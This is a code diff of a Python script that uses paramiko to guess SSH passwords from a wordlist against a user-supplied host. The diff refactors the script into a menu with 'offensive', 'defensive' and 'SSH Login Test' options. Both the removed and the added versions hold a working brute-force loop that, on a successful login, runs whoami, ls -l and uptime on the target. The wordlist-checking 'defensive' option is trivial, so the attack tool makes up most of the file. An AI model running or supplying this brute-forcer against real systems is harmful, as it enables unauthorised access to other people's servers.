@@ -12,51 +12,84 @@
 
 import time
 import paramiko
-import sys
 
-host = input("IP:")
-user = input("Username: ")
-filepath = input("filepath: ")
-port = 22
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-with open(filepath, 'r') as file:
-    line = file.readline()
-    print(line)
-
-while line:
-    password = line.strip()
+def ssh_connect(host, port, user, password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-      ssh.connect(host, port, user, password)
-      stdin, stdout, stderr = ssh.exec_command("whoami")
-      time.sleep(3)
-      output = stdout.read()
-      print("________________")
-      print(output)
-      print("________________")
-      stdin, stdout, stderr = ssh.exec_command("ls -l")
-      time.sleep(3)
-      output = stdout.read()
-      print("________________")
-      print(output)
-      print("________________")
-      stdin, stdout, stderr = ssh.exec_command("uptime")
-      time.sleep(3)
-      output = stdout.read()
-      print("________________")
-      print(output)
-      print("________________")
-      print(f"password is: {password}")
-      print("________________")
-      break # Exit the loop if successful login occurs
-    
-    except paramiko.AuthenticationException as e:
-      print("________________")
-      print(f"Password: {password}")
-      print(e)
-      print("________________")
-    line = file.readline()
+        ssh.connect(host, port, user, password)
+        return ssh, True
+    except paramiko.AuthenticationException:
+        return None, False
 
-file.close()
-ssh.close()
+def offensive_mode(filepath):
+    print("Offensive mode selected. This option is not implemented in this example.")
+
+def defensive_mode(word, filepath):
+    with open(filepath, 'r') as file:
+        words = file.read().splitlines()
+        if word in words:
+            print("Word found in list.")
+        else:
+            print("Word not found.")
+
+def ssh_login_test(host, user, filepath):
+    with open(filepath, 'r') as file:
+        for line in file:
+            password = line.strip()
+            print(f"Trying password: {password}")
+            ssh, success = ssh_connect(host, 22, user, password)
+            if success:
+                print("____________________________________________")
+                print(f"Success! Password is: {password}")
+                print("____________________________________________")
+
+                # Execute and display the output of 'whoami'
+                stdin, stdout, stderr = ssh.exec_command("whoami")
+                print("____________________________________________")
+                print("User:", stdout.read().decode().strip())
+                print("____________________________________________")
+
+                # Execute and display the output of 'ls -l'
+                stdin, stdout, stderr = ssh.exec_command("ls -l")
+                print("____________________________________________")
+                print("Directory Listing:\n", stdout.read().decode().strip())
+                print("____________________________________________")
+
+                # Execute and display the output of 'uptime'
+                stdin, stdout, stderr = ssh.exec_command("uptime")
+                print("____________________________________________")
+                print("System Uptime:", stdout.read().decode().strip())
+                print("____________________________________________")
+
+                ssh.close()
+                break
+            time.sleep(1)
+
+def main():
+    choose = "Choose an option"
+    print(f"{choose:^60}")
+    print("Option 1: Offensive; Dictionary Iterator")
+    print("Option 2: Defensive; Password Recognized")
+    print("Option 3: SSH Login Test")
+
+    option = input("Your choice: ")
+
+    if option == "1":
+        filepath = input("Enter file path for the dictionary: ")
+        offensive_mode(filepath)
+    elif option == "2":
+        usrinput = input("Enter word: ")
+        filepath = input("Enter file path for word list: ")
+        defensive_mode(usrinput, filepath)
+    elif option == "3":
+        host = input("IP: ")
+        user = input("Username: ")
+        filepath = input("Enter file path for password list: ")
+        ssh_login_test(host, user, filepath)
+    else:
+        print("Invalid option, please choose 1, 2, or 3.")
+
+if __name__ == "__main__":
+    main()
+
